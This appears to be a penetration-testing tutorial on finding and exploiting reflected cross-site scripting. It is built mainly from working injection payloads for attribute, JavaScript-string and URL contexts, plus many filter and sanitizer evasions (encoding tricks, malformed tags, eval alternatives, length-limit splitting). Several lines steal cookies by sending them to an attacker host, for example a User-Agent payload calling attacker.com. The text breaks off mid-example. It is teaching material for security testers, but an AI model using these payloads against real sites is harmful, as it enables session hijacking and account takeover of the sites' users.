# 🧭 Section: **Finding and Exploiting Reflected XSS Vulnerabilities (Part 1)**

---

## 🔹 Step-by-Step Strategy for Detecting Reflected XSS

This is about being methodical — think like a scanner, but with a brain. Reflected XSS doesn’t store the payload; it just bounces it back in a response. The trick is to find where the app **mirrors** your input and **in what context**, then slip a script through that.

---

### 🧪 Step 1: Submit a **Benign Unique String**

**Why?**
To detect reflections **without triggering filters** or being mistaken for something already in the page.

**How?**
Pick a string like:

```
myxsstestdmqlwp
```

**Reasoning:**

* Purely alphabetic → unlikely to be encoded or filtered.
* Unique → easy to spot visually or via diff.
* Non-malicious → won’t trigger WAF or app filters.

> You’re not attacking yet — you’re probing the app like sonar.

---

### 🔍 Step 2: Detect Reflections in the Response

**Why?**
To find the places where input is echoed back into the page. This is the *must-have* condition for reflected XSS: **input → reflected into output**.

**What to Look For:**

* Reflected in raw HTML?
* Inside HTML attributes?
* Inside JavaScript?
* In comments or tags?

Each of those is a **different syntactic context**, and each needs a different payload structure later.

---

### 📦 Step 3: GET and POST — Test Both

**Why?**
Many testers forget POST — but reflected XSS **can** happen in POST parameters. Even though it’s harder to deliver (you can’t just send a clickable URL), **it’s still exploitable**.

**Pro tip:**
Use Burp's “**Change Request Method**” feature to flip POST → GET and see if the vuln is reachable with a URL.

This is gold for making the XSS:

* Sharable via email
* Embedded in img/script tags
* Delivered via cross-origin tricks

---

### 🧠 Step 4: Headers Are Inputs Too (Don’t Skip Them!)

> **Most people only test form fields or URL params. But in reality: every part of the HTTP request is an input vector.**

Especially:

| Header            | Why It’s Dangerous                   |
| ----------------- | ------------------------------------ |
| `Referer`         | Often shown in error/debug pages     |
| `User-Agent`      | Reflected in logs or status messages |
| `X-Forwarded-For` | Used by some apps to show client IP  |

**Why it works:**
These headers are often reflected in logs, error messages, or analytics dashboards. Admins view those pages. Boom — your XSS payload executes when they check logs.

---

### 🚨 Example: Header-Based Reflected XSS Chain

1. You inject XSS into the `User-Agent` header:

   ```
   Mozilla/5.0"><script>new Image().src='http://attacker.com/'+document.cookie</script>
   ```
2. App logs this header on an error page.
3. Admin views the error report.
4. Your payload executes in their browser.

> No visible UI. No login needed. All through an invisible string in a header. That’s stealth.

---

### 📌 Summary So Far

| Goal                     | Action                                          | Reasoning                                                |
| ------------------------ | ----------------------------------------------- | -------------------------------------------------------- |
| Detect reflected input   | Use benign string like `myxsstestdmqlwp`        | Avoids false positives, triggers, or interference        |
| Map reflection locations | Look for every spot your input shows up         | These are your targets for payload injection             |
| Understand context       | Identify whether it's HTML, JS, attribute, etc. | Payload must match context to break out and execute code |
| Test all input types     | GET, POST, headers                              | Vulnerabilities may hide in overlooked places            |
| Look beyond basics       | Include HTTP headers like Referer/User-Agent    | Advanced attack delivery options                         |

---

## 🔥 Section: **Testing Reflections to Introduce Script**

---

### 🎯 Goal:

Take reflected input → understand the *context* it appears in → inject **context-aware payload** to trigger JavaScript execution.

### Why context matters:

The browser parses HTML differently depending on *where* the input shows up:

* Inside a tag attribute?
* Inside a JS string?
* Inside raw HTML?
* Inside an event handler?

Understanding this is key. Blindly injecting `<script>` won’t always work — modern browsers are stricter, and WAFs often filter that. So we craft smarter.

---

## 🧪 **Example 1: Reflected Inside an Attribute Value**

### Input reflected here:

```html
<input type="text" name="address1" value="myxsstestdmqlwp">
```

Your reflection is inside the `value` attribute of a tag.

---

### 🚨 Attack Strategy 1: Break Out of the Attribute

#### Payload:

```html
"><script>alert(1)</script>
```

### 🧠 Logic:

1. `"` closes the attribute value.
2. `>` closes the `<input>` tag.
3. `<script>alert(1)</script>` is now injected as real HTML that gets parsed and executed.

> This works if the app doesn’t sanitize `"` or `<`.

---

### 🧨 Attack Strategy 2: Stay Inside the Tag, Use an Event Handler

#### Payload:

```html
" onfocus="alert(1)
```

### 🧠 Logic:

1. Still inside `<input ...>`.
2. `onfocus` is a valid attribute that executes when the field gains focus.
3. No need to break out of tag or use `<script>`.

> Stealthier and often bypasses basic filters that just block `<script>` or `<`.

---

## 🔥 **Example 2: Reflected Inside a JavaScript String**

### Input reflected here:

```html
<script>var a = 'myxsstestdmqlwp'; var b = 123;</script>
```

---

### 🚨 Attack Strategy: Break Out of the JS String + Continue Code

#### Payload:

```javascript
'; alert(1); var foo='
```

### 🧠 Logic:

1. `'` ends the current JS string.
2. `;` ends the current statement.
3. `alert(1);` executes your payload.
4. `var foo='` continues the JS in a valid way so the original code doesn’t error out.

#### Alternative trick:

```javascript
';alert(1)// 
```

* `//` comments out everything after the injection point → prevents errors if the remaining JS is malformed.

> Always think like a parser. JavaScript needs to remain syntactically valid *after* your payload or the code won’t run at all.

---

## ⚔️ **Example 3: Reflected Inside an Attribute Containing a URL**

### Input reflected here:

```html
<a href="myxsstestdmqlwp">Click here</a>
```

---

### 🚨 Attack Strategy: Use the `javascript:` URI Scheme

#### Payload:

```html
javascript:alert(1)
```

### 🧠 Logic:

1. `href` attributes allow URI schemes (`http:`, `mailto:`, etc.).
2. `javascript:` is also a valid scheme that executes JS.
3. When the user clicks the link → payload fires.

> Some browsers block this scheme in modern contexts (esp. if CSP is in place), but it’s still a viable test during assessment.

---

### 🧨 Bonus: Trick With Broken Images or Fragments

#### Payload:

```html
#" onclick="javascript:alert(1)
```

### 🧠 Logic:

1. `#` makes the link go nowhere.
2. `onclick` attribute hijacks the click behavior.
3. Payload runs without needing `javascript:` in href, bypassing CSP in some cases.

---

## 🛠️ HACK STEPS (Applied with Context):

### ✅ Step 1: Review Source

* View page source — *don’t* rely just on rendered view.
* Find exact spot where your benign string appears.

### ✅ Step 2: Treat Each Reflection Separately

* Even if the string appears 5 times → test each in its own context.
* One may be exploitable, others may not.

### ✅ Step 3: Understand the Syntactic Context

| Reflection appears in...    | Use this strategy                         |
| --------------------------- | ----------------------------------------- |
| HTML tag body               | Use `<script>`                            |
| Tag attribute               | Break out + use event handler or JS       |
| Inside JS string            | Close quote → end statement → inject code |
| URL field (href, src, etc.) | Use `javascript:` scheme or event handler |

### ✅ Step 4: Test Your Payload

* Use basic `alert(1)` first for visibility.
* Validate actual execution, not just rendering.
* Confirm if the payload survives → **then escalate** to real actions (cookie theft, DOM rewrites, etc.)

---

## 📌 Key Lessons Recap

| Concept                       | Why It Works / Matters                                                      |
| ----------------------------- | --------------------------------------------------------------------------- |
| Attribute escape (`" >`)      | Escapes current attribute context to inject new elements or code            |
| JavaScript escape (`';`)      | Escapes string and resumes valid code to avoid syntax errors                |
| Event handler (`onfocus=...`) | Triggers JS without script tag, works within tag attributes                 |
| `javascript:` in `href`       | Browser interprets as code — no script tag needed                           |
| `//` comment in JS contexts   | Ensures the rest of JS is ignored, avoiding breakage                        |
| Separate reflections per case | Context-specific behavior — one reflection might be exploitable, others not |
| Encoding matters              | Must URL-encode special characters (`<`, `>`, `"`, space) in request        |

---

## 🛡️ Section: **Probing Defensive Filters**

When your XSS payload gets blocked, that doesn’t mean game over — it just means the app has a **filter**. Your goal is now to:

* Figure out *what* the filter is doing.
* Then craft payloads that **sneak around** it.

---

### 🔎 Step 1: Understand the 3 Possible Filter Behaviors

| Behavior                     | What Happens                                                             | Your Move                                                                     |
| ---------------------------- | ------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| **Signature-based blocking** | The app detects “bad patterns” like `<script>` and **rejects or errors** | Try **payload obfuscation or alternate tags/contexts**                        |
| **Sanitization/Encoding**    | The app **mangles** your payload (e.g., converts `<` → `&lt;`)           | Use **filter evasion** tricks (attribute injection, encoding reversals, etc.) |
| **Truncation**               | Your input is **cut off** at a certain length                            | Use **short payloads** or chain injection across multiple fields              |

We'll tackle the **first one** here: signature-based blocking.

---

## 🧨 Beating Signature-Based Filters

Signature-based filters are like dumb bouncers:

* See `<script>`? Block it.
* See `onerror=`? Block it.

The problem? They're usually naive and rigid. You just need to **disguise** your payload or **change your approach**.

---

### 🧠 Tactic: Find What Triggers the Filter

**Approach:**

1. Start with a basic payload that gets blocked.
2. Remove parts bit by bit to isolate the triggering pattern (e.g., just `<`, then just `script`, etc.).
3. Once identified, switch to bypass mode.

---

## 🚀 Methods of Injecting Script Code (and Bypassing Filters)

Now let’s walk through the **4 core script delivery vectors**, including *why they work*, and some **obscure real-world bypasses** that still function.

---

### 1️⃣ **Script Tags**

Basic version:

```html
<script>alert(1)</script>
```

But filters usually block that. So...

#### 🔍 Why It Works:

Because script tags are an explicit JS execution context. Browser sees `<script>` → executes JS inside.

#### 🧨 Bypass Tactics:

**Using `data:` URIs inside other tags:**

```html
<object data="data:text/html,<script>alert(1)</script>">
```

**Base64-encoded payload:**

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

> Why this works: You're *embedding an HTML page* inside a tag that loads external content. Browser interprets the payload as new HTML, which contains your script.

✅ **Bypasses filters** that only scan the main request and miss nested HTML contexts.

---

### 2️⃣ **Event Handlers**

Instead of `<script>`, inject:

```html
<img src=x onerror=alert(1)>
```

#### 🔍 Why It Works:

Browsers execute event handlers like `onerror`, `onload`, `onfocus`, etc., when triggered by user or page behavior.

#### 🔥 Obscure Bypass Vectors:

* **No user interaction required:**

```html
<iframe onreadystatechange=alert(1)>
<xml onreadystatechange=alert(1)>
<object onerror=alert(1)>
```

* **HTML5-specific tricks:**

```html
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus>
</a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
```

> Why these work: They exploit *auto-triggering events* in modern and legacy HTML5 elements. No need for a click — the browser **automatically fires** the handler.

🧠 These often bypass filters that only scan for `onerror` inside `<img>` or `<script>`.

---

### 3️⃣ **Script Pseudo-Protocols**

```html
<a href="javascript:alert(1)">Click here</a>
<iframe src="javascript:alert(1)">
```

#### 🔍 Why It Works:

Browsers interpret `javascript:` URLs as executable code, *especially* in attributes that expect a URL (`href`, `src`, `action`).

#### 🧨 Filter Bypasses:

* Use uncommon tags:

```html
<form id=x /><button form=x formaction="javascript:alert(1)">
```

* Use **HTML5 hyphenated tags** (breaks old regex filters):

```html
<event-source src="javascript:alert(1)">
```

> Why this works: Filters often look for tag names like `<script>`, `<img>`, etc. They **don’t expect hyphenated tags** or protocol abuse in lesser-known attributes.

---

### 4️⃣ **Dynamically Evaluated Styles**

#### Legacy (IE7 and earlier):

```html
<x style="x:expression(alert(1))">
```

#### IE9+ (Compatibility mode or fallback):

```html
<x style="behavior:url(#default#time2)" onbegin="alert(1)">
```

#### 🔍 Why It Works:

Older IE browsers evaluated CSS `expression()` and behaviors as JavaScript.

This was *intended* for dynamic styles like:

```css
width: expression(document.body.offsetWidth * 0.5);
```

But attackers hijacked it for XSS.

> These are rare today but still valuable for **legacy app testing** or **kiosk bypass**.

---

## ✅ Summary Table: Evading Signature-Based Filters

| Technique            | Example                                      | Why It Works                                      |
| -------------------- | -------------------------------------------- | ------------------------------------------------- |
| **Tag Wrapping**     | `<object data="data:text/html,<script>...">` | Hides script inside another tag                   |
| **Base64 Encoding**  | `<a href="data:text/html;base64,...">`       | Encodes malicious HTML to evade pattern matching  |
| **Event Handlers**   | `<input autofocus onfocus=...>`              | Browser auto-triggers event without interaction   |
| **Pseudo-Protocols** | `href="javascript:..."`                      | Browser executes JS as if it were a link          |
| **HTML5 Tags**       | `<video src=1 onerror=...>`                  | Exploits newer tags not recognized by old filters |
| **CSS/IE Hacks**     | `<x style=expression(...)>`                  | Legacy IE-specific JS-in-CSS tricks               |

---

## 🧠 Why Signature Filters Fail

1. **Too narrow**: Only block `<script>` and `onerror`.
2. **Too literal**: Don’t decode Base64, don’t parse embedded tags.
3. **Don’t emulate browsers**: The browser will happily execute malformed or weirdly-encoded payloads.
4. **Regex ≠ parser**: HTML is not regex-friendly. That’s why regex-based filters fail.

---

## Bypassing Filters: HTML

### Goal:

You're trying to bypass XSS filters that rely on:

* **Regular expressions**, or
* **Pattern-based signatures**

…by creatively **breaking their assumptions about HTML structure**, while still writing payloads browsers will interpret as valid and executable.

---

## 🎭 1. **Obfuscating Tag Names**

### 🔹 What’s the basic idea?

Filters often scan for specific tag names like `<script>`, `<img>`, `<iframe>`, etc. If you change the way the tag appears *just enough to fool the filter but not the browser*, you win.

---

### 🔹 Techniques and *Why* They Work:

#### ✅ Case variation:

```html
<iMg onerror=alert(1) src=a>
```

* **Why it works:** HTML is **case-insensitive**. So `<IMG>` and `<img>` are the same to the browser, but a naive filter doing `/<img/` won’t catch `<iMg>`.

#### ✅ NULL byte injection (`%00`):

```html
<i[%00]mg onerror=alert(1) src=a>
```

* **Why it works:** NULL bytes (`%00`) are used to **terminate strings** in many programming languages and WAFs. Filters may think the input ends there and ignore the rest, but the browser doesn’t.

#### ✅ Arbitrary tag names with event handlers:

```html
<x onclick=alert(1)>Click</x>
```

* **Why it works:** Most filters are tuned to block `<script>` and `<img>`, but **event handlers (`onclick`, etc.) can be attached to *any tag***. Even a made-up tag like `<x>`.

#### ✅ Base Tag Hijacking:

```html
<base href="http://attacker.com/scripts/">
<script src="legit.js"></script>
```

* **Why it works:** `<base>` redefines how relative URLs are resolved. If the site loads scripts after your injected base tag, the browser will **pull attacker’s script but run it in the site’s origin.**

---

## 🔹 2. **Space After Tag Name**

### Examples:

```html
<img/onerror=alert(1)>
<img%09onerror=alert(1)>
<img/anyjunk/onerror=alert(1)>
```

### ✅ Why it works:

* HTML parsers tolerate **tabs (`%09`), line breaks (`%0a`), carriage returns (`%0d`)**, or junk between the tag name and attributes.
* Filters that expect a **space after `<img`** will fail to detect the attack.

---

## 🔹 3. **Attribute Name Obfuscation**

### Example:

```html
<img o[%00]nerror=alert(1)>
```

### ✅ Why it works:

* Some filters block attribute names starting with `on` (like `onerror`), but adding a NULL byte **tricks the filter into thinking it’s not an event handler.**
* Browser **ignores the NULL byte** and parses the full event handler.

---

## 🔹 4. **Attribute Delimiters & Order**

### Example with backticks:

```html
<img onerror=`alert(1)`>
```

### ✅ Why it works:

* Backticks **aren’t officially valid**, but **IE and other legacy browsers allow them** as attribute value delimiters.
* Filters may only scan for `"value"` or `'value'`.

### Example with attribute reordering:

```html
<img src=`a`onerror=alert(1)>
```

* If filter only checks attributes like `onerror=...`, it won’t catch this reordered variant.

---

## 🔹 5. **No Whitespace Required**

### Example:

```html
<img/onerror=”alert(1)”src=a>
```

* No whitespace between attributes, which **breaks some filters** expecting space-separated attributes.

---

## 🔹 6. **Obfuscating Attribute Values**

### NULL Byte + HTML Entity Encoding:

```html
<img onerror=a[%00]lert(1)>
<img onerror=a&#x6c;ert(1)>
```

### ✅ Why it works:

* Browsers **decode HTML entities** (like `&#x6c;` = `l`) before execution.
* This **bypasses filters** that scan for known payload strings like `alert(`.

---

## 🔹 7. **Obfuscating Pseudo-Protocols**

### Example:

```html
<iframe src=j&#x61;vascript:alert(1)>
```

* `&#x61;` = `a`, so this decodes to `javascript:alert(1)`.
* Bypasses filters checking for `javascript:` directly.

---

## 🔹 8. **Tag Bracket Tricks**

### Double-encoding:

```http
%253cimg%20onerror=alert(1)%20src=a%253e
```

#### Process:

1. `%253c` → `%3c` → `<`
2. `%3cimg ... %3e` → `<img ... >`

✅ **Why it works:** Some apps **decode input twice**, especially during logging or preprocessing stages.

---

### Unicode Brackets (glyph lookalikes):

```html
«img onerror=alert(1) src=a»
```

* `%u00AB` and `%u00BB` are **double-angle brackets**.
* Some **frameworks auto-convert** them to `<` and `>`, enabling the attack.

---

### Superfluous brackets:

```html
<<script>alert(1)//<</script>
```

* Browsers can recover from malformed tags like `<<script>`.
* Filters might reject `<script>` but ignore the double bracket syntax.

---

### E4X (ECMAScript for XML):

```html
<script<{alert(1)}/></script>
```

* Weird syntax that **older Firefox versions** parsed and executed.
* Useful when targeting **browser-specific vulnerabilities**.

---

## 🔹 9. **Character Sets and Encodings**

### Goal:

Deliver payloads encoded in alternative charsets (like UTF-7 or UTF-16) that the browser interprets correctly, but **filters don’t recognize**.

#### Example:

UTF-7:

```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```

UTF-16:

```
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00
```

### ✅ Why it works:

* Filters expecting UTF-8 or ASCII won't decode UTF-7/UTF-16 correctly.
* But browsers often **trust charset hints** from HTTP headers or `<meta charset=...>` and will interpret the payload as script.

---

### Advanced charset abuse (e.g., Shift-JIS):

#### Input 1:

```html
[%f0] ← multibyte lead byte in Shift-JIS
```

#### Input 2:

```html
"onload=alert(1);
```

### ✅ Why it works:

* In Shift-JIS, `%f0` + next byte is a **valid character**, so `"onload...` becomes **part of one character**, and not filtered.
* Second `"onload=...` becomes **an actual HTML attribute**, leading to execution.

---

## 💡 Key Insight

🧠 Most filters operate on **string-level assumptions** about well-formed HTML. Browsers don’t—they try to **“fix” broken HTML**. That’s the **mismatch** attackers exploit.

If the browser tolerates malformed input and runs your code, it’s a valid XSS attack—even if the app thinks it’s safe.

---

## ✅ What You Should Practice

1. **Build a local HTML page**, test malformed inputs like:

   * Double angle brackets
   * Null bytes
   * Obfuscated `onerror` attributes

2. **Test with different encodings**:

   * Try `+ADw-script+AD4-...` using charset switching in browser dev tools.

3. **Simulate filter behaviors**:

   * Use regex in Burp or a test app to mimic basic filters.
   * Try payloads that break them.

---

## 🧠 Bypassing Filters: Script Code

Filters that aim to stop XSS usually try to block:

* **Keywords** (`alert`, `script`, `eval`, etc.)
* **Syntax characters** (`"`, `'`, `.`, `()`, etc.)
* **Dangerous functions** (`eval()`, `document.cookie`, etc.)

But JavaScript is flexible—*really flexible.* It allows **multiple encodings**, **runtime string building**, and **language mixing**. You can use this power to *bypass broken filters*.

---

## 🔓 JavaScript Escaping Tricks

### 🔸 Unicode Escaping

JavaScript lets you insert characters with `\uXXXX`.

```html
<script>a\u006cert(1)</script> 
```

🧠 Why it works:

* `\u006c` is `l`. So this becomes `alert(1)`.
* If the filter looks for `"alert"` literally, this bypasses it.
* Browsers decode this **before** script parsing.

---

### 🔸 Hex and Octal Escapes inside `eval()`

```html
<script>eval('a\x6cert(1)')</script>   // hex
<script>eval('a\154ert(1)')</script>   // octal
```

🧠 Why it works:

* `\x6c` = `l`, `\154` (octal) = `l`
* Still resolves to `alert(1)`, just written weirdly.

---

### 🔸 Fake Escapes / Garbage in Strings

```html
<script>eval('a\l\ert\(1\)')</script>
```

🧠 Why it works:

* JavaScript ignores garbage escape sequences in **strings**, so this gets interpreted as `'alert(1)'`.

---

## 🧱 Dynamically Constructed Strings

You can **build dangerous strings on the fly**:

```html
<script>eval('al' + 'ert(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64 encoded 'alert(1)'
```

🧠 Why it works:

* Filters block `"alert"`—but if you construct it dynamically, they miss it.
* Base64 (`atob`) adds another layer of obfuscation.

---

## 🚫 Alternatives to `eval()`

Some filters block `eval` — but JavaScript has **many eval-like behaviors**.

```html
<script>'alert(1)'.replace(/.+/, eval)</script>  // Calls eval
<script>Function('alert(1)')()</script>          // Function constructor
```

🧠 Why it works:

* These act like `eval()` without using the word.
* `Function()` is often overlooked by weak filters.

---

## 🧩 Bypassing Dot (`.`) Blocking

Some filters block the period (`.`), which breaks `document.cookie`.

But you can still get what you want:

```html
<script>alert(document['cookie'])</script>
<script>with(document) alert(cookie)</script>
```

🧠 Why it works:

* Using bracket notation (`['cookie']`) or `with()` avoids the dot entirely.

---

## 🎭 Combining HTML + JavaScript Obfuscation

### Example:

```html
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
```

🧠 Why it works:

* `&#x5c;` = backslash, so it becomes `\u0065`, which is `e`.
* Result: `alert(1)`
* All encoded in HTML so it dodges both **HTML and JS** filters.

You can go further:

```html
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

All characters encoded = hard to detect.

---

## 🧪 Using VBScript (IE Only)

Modern browsers don't support this anymore, but older **Internet Explorer** versions do.

```html
<script language=vbs>MsgBox 1</script>
<img onerror="vbs:MsgBox 1" src=a>
```

🧠 Why it worked:

* IE could execute VBScript.
* Filters that target only JavaScript fail completely.

### Notable VBScript Properties:

* **No case sensitivity** (`MSGBOX`, `MsgBox`, `msgbox` all work)
* **Brackets optional**
* **Use `+1` instead of space**

```html
<img onerror=MsgBox+1 language=vbs src=a>
```

Filters that expect brackets and quotes get wrecked here.

---

## 🔁 Mixing JavaScript & VBScript

For full chaos, you can **cross-call** languages:

```html
<script>execScript("MsgBox 1", "vbscript")</script>
<script language=vbs>execScript("alert(1)")</script>
```

🧠 Why it works:

* `execScript()` lets you hop between JS ↔ VBScript
* VBScript can construct lowercased JS (`LCASE()`) to bypass case-enforcement:

```html
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)")) </SCRIPT>
```

---

## 🧬 Encoded Scripts (IE Only)

Microsoft had a custom script encoding system:

```html
<img onerror="VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@" src=a>
```

🧠 Why it worked:

* The script is Base64-like, hard to detect.
* IE would decode it automatically.
* Old anti-XSS filters didn’t know how to parse it.

Modern tools like `srcdec.exe` or online decoders can reverse-engineer this.

---

## 🧠 Summary Table

| Technique                  | Works By             | Defeats              |
| -------------------------- | -------------------- | -------------------- |
| `\u` Unicode escapes       | Hiding keywords      | Signature filters    |
| `eval('a'+'lert')`         | Dynamic construction | Keyword filters      |
| `Function()` / `replace()` | Alt-eval             | Eval restrictions    |
| `document['cookie']`       | Dotless deref        | Dot blockers         |
| VBScript                   | IE-only language     | JS-only filters      |
| HTML-encoded JS            | Mix of obfuscations  | Dual-layer filters   |
| Script encoding            | Encoded payloads     | Basic static filters |

---

## ✅ TL;DR

This section taught you how to **mutate JavaScript syntax** at runtime and **abuse browser quirks** to:

* **Dodge static filters**
* **Avoid detection**
* **Exploit even when keywords/characters are blocked**

Each technique is **grounded in real JavaScript flexibility**, and that’s why they work—**because browsers tolerate chaos**, and most filters don’t account for that chaos.

---

Here's a **deep and full breakdown** of the section **“Beating Sanitization”** from Chapter 12 — including **logic**, **why each trick works**, and **realistic bypass scenarios** that directly reflect the text.

---

## 🛡️ Beating Sanitization — Full Breakdown (HackTheBox-style)

When XSS filters **actively change your input** (not just block it), you’re dealing with **sanitization**. Instead of blocking the payload, the application tries to **disarm** it — either by:

* Replacing dangerous characters (like `<`, `>`) with safe equivalents (like `&lt;`, `&gt;`)
* Escaping quotes or slashes
* Removing specific strings (like `<script>`)

But — as with all defense mechanisms — **most sanitizers are flawed**.

Let’s break down how to punch through these flawed protections.

---

### 🔐 1. Understand the Sanitizer

Before you bypass anything, first ask:

> **"What is it breaking, and what is it leaving untouched?"**

Examples:

* Are **angle brackets** being HTML-encoded?
* Are **script tags** being removed?
* Are **quotes escaped with `\`?**
* Are only the **first** dangerous string removed?

Once you know that, you can choose your technique.

---

### 🧼 2. HTML-Encoding-Based Sanitization

**Behavior**: `<` becomes `&lt;`, `>` becomes `&gt;`, etc.

🔨 **Bypass Logic**:

* If you're *inside an existing script block*, you **don’t need angle brackets.**

  * Example:

    ```html
    <script>var a = 'user input';</script>
    ```
  * Here, you only need to escape `'` or break out of it — no `<script>` required.

* Or use **alternative tags** like `<img onerror=...>` instead of `<script>`.

✅ **Use prior techniques**:

* Event handlers (`onerror`)
* Unicode, hex, or base64-encoded payloads
* String construction (like `String.fromCharCode()`)

---

### 🧹 3. Stripping/Removing Dangerous Tags

**Behavior**: The app removes `<script>` from your input.

🔨 **Bypass Logic**:

* Check if it removes **all** instances:

  ```html
  <script><script>alert(1)</script>
  ```

  – Some sanitizers only remove the *first* instance due to `replace()` vs `replaceAll()` mix-up.

* Try **recursive tricks**:

  ```html
  <scr<script>ipt>alert(1)</script>
  ```

* Try **confusing mixed tags**:

  ```html
  <scr<object>ipt>alert(1)</script>
  ```

🧠 Why it works:

* Browser interpreters may “fix” malformed or nested tags.
* The sanitizer strips `script` and `object`, but **not both at the same time**, allowing fragments to slip through.

---

### 🧨 4. Escaped Quotes Inside JavaScript

**Context**: Your input is being dropped inside a JS string:

```html
<script>var a = 'userinput';</script>
```

**Sanitizer behavior**: Escapes `'` as `\'`

🔨 **Bypass Logic**:

* Inject a **backslash followed by a quote**:

  ```js
  foo\';alert(1);// 
  ```

  Results in:

  ```js
  var a = 'foo\'; alert(1);//';
  ```

🧠 Why it works:

* Backslash escapes the closing quote → *you break out of the string*.
* `//` comments out the rest of the script.

---

### 🔁 5. Escaping the Escaper (Double Escaping)

Sometimes sanitizers escape quotes and also backslashes:

```js
'foo\\';alert(1);//'
```

If that’s the case, try **injecting a closing tag** to break out:

```html
</script><script>alert(1)</script>
```

🧠 Why it works:

* Browsers give **HTML tag parsing** priority.
* Even if the first `<script>` is broken due to malformed JavaScript, your new `<script>` runs fine.

✅ **This is a classic XSS move** when injecting inside a `<script>` block.

---

### 🎯 6. Encoding Quotes in Event Handlers (DOM-based)

**Context**:

```html
<a href="#" onclick="var a = 'userinput'; ...">
```

**Sanitizer behavior**: Escapes `'` and `\`

🔨 **Bypass Logic**: Use **HTML-encoded characters** that decode later:

```html
foo&apos;;alert(1);//
```

Becomes:

```html
<a href="#" onclick="var a = 'foo&apos;;alert(1);//'; ...">
```

🧠 Why it works:

* HTML decoding occurs **before** JavaScript execution in attributes like `onclick`.
* `&apos;` → `'` just in time to break out of the string.

This is a classic **DOM-based XSS** bypass.

---

## 🔍 Filter Bypass Checklist

When you're testing sanitization, ask yourself:

| ✅ Test                             | 🔎 Purpose                                      |
| ---------------------------------- | ----------------------------------------------- |
| Are angle brackets being encoded?  | Blocks `<script>` or `<img>`?                   |
| Are quotes being escaped with `\`? | Can I break out of strings?                     |
| Is the backslash itself escaped?   | Can I double escape?                            |
| Are tags removed or encoded?       | Can I bypass with other tags or event handlers? |
| Is there recursive sanitization?   | Can I nest elements?                            |
| Are multiple layers used?          | Can I exploit ordering?                         |

---

## 🧠 Real-World Logic: Why This All Works

Most filters operate at a **syntactic** level:

* They look for literal patterns like `<script>`, `alert(`, or `"`
* They don’t interpret how a browser will **decode and execute** the content.

Browsers, meanwhile:

* Are **lenient and forgiving** — they “repair” broken markup.
* Decode HTML and JS **in stages**, which lets attackers sneak things through if they understand the execution flow.

---

## ✅ TL;DR

* **Sanitizers are often broken** — either by poor logic, improper escaping, or failure to handle browser quirks.
* Test what characters get changed.
* Try to bypass with encoding, escaping, tag trickery, or string breaking.
* Event handlers, script tags, and malformed nesting are your tools.

---


## 🎯 Bypassing Length Limits in XSS Payloads

When a web app **truncates or limits input length**, you’ve got 3 main counterattack strategies.

Each lets you deliver fully functional payloads despite size restrictions, and some can even **chain multiple injection points** or **escape input filters altogether**.

---

## ✅ Technique 1: 🔪 Shrinking Your Payload

### 💡 Idea:

Write **shorter payloads** using:

* Minimal syntax
* Smaller hostnames (e.g., `a`, `b`)
* JS APIs with short names
* Skipping unnecessary characters

---

### 🔧 Examples:

#### Injecting into JavaScript

```js
open("//a/"+document.cookie)
```

* ✅ *Only 28 bytes*
* Calls `open()` to send a request to `a`, appending the cookie as a path.
* Works because most browsers allow protocol-relative URLs (`//a/...`).

#### Injecting into HTML

```html
<script src=http://a></script>
```

* ✅ *30 bytes*
* Browser fetches and executes remote script from `http://a`.

---

### 🧠 Why It Works:

* Apps often apply filters based on **length assumptions** — expecting large payloads.
* This trick slips in **small functional code**, sometimes bypassing both WAFs and backend length filters.

---

### 🔥 Extra Tip:

Use **Dean Edwards' JS Packer** to compress longer scripts:

> [http://dean.edwards.name/packer/](http://dean.edwards.name/packer/)

This helps you:

* Remove whitespace
* Encode obfuscated scripts
* Fit more logic into fewer characters

---

## ✅ Technique 2: 🧩 Spanning the Payload Across Fields

### 💡 Idea:

Split your full XSS payload across **multiple input fields**, which are injected into **different HTML elements** in the response.

Each field holds a **partial string**, and when rendered together, the browser reconstructs the full script.

---

### 🧠 Example Breakdown:

#### Original URL:

```
https://myapp.com/account.php?page_id=244&seed=129402931&mode=normal
```

Suppose:

* Each param has a tight length limit (e.g., 12 characters)
* But... *they all reflect back into the same page*

You inject:

```
?page_id="><script>/*
&seed=*/alert(document.cookie);/*
&mode=*/</script>
```

#### Final Rendered HTML:

```html
<input name="page_id" value=""><script>/*">
<input name="seed" value="*/alert(document.cookie);/*">
<input name="mode" value="*/</script>">
```

### ✅ Exploit Breakdown:

* **Comment blocks** (`/* */`) hide the junk text between your script lines.
* The only code executed is the complete:

  ```js
  <script>alert(document.cookie);</script>
  ```
* Everything in between becomes ignored comments.

---

### ⚠️ Pro Tip:

Many apps apply different filters or limits to different params. Example:

| Param    | Length Limit | XSS Filter? |
| -------- | ------------ | ----------- |
| page\_id | 12 chars     | ❌ None      |
| seed     | unlimited    | ✅ Strong    |
| mode     | 12 chars     | ❌ None      |

By strategically splitting your payload, you bypass strong filters in long fields by **relying on shorter, unfiltered fields** to deliver the dangerous characters (`<`, `>`).

---

## ✅ Technique 3: 🔁 Convert to DOM-Based XSS

### 💡 Idea:

Inject a **tiny payload** into the reflected page that reads and executes code from the **fragment/hash** portion of the URL.

Since the **hash is not sent to the server**, it bypasses all server-side filtering.

---

### ⚔️ Example:

#### Reflected XSS Injection:

```html
<script>eval(location.hash.slice(1))</script>
```

✅ Only **45 bytes** — perfect for tight limits.

#### Full URL:

```
http://target.com/vuln?message=<script>eval(location.hash.slice(1))</script>#alert(1)
```

* The payload in the `message` param is reflected into the page.
* The browser sees this:

  ```html
